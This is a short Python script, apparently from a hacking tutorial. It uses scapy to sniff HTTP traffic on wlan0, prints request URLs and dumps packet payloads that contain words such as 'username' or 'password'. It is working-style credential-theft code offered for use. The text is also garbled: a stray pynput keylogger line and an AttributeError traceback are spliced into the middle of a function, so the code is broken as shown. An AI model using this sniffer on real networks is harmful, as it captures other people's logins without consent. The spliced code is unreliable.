# !/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "email", "login", "password", "pass"]
        for keywords in keywords:
            if keywords in load:
                return load


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest) and packet.haslayer(scapy.Raw):
        url = get_url(packet) keyboard_listener = pynput.keyboard.Listner(on_press=process_key_press)
AttributeError: 'module' object has no attribute 'Listner'

        print("[+] HTTP request >>>>>     " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >  " + login_info + "\n\n")


sniff("wlan0")
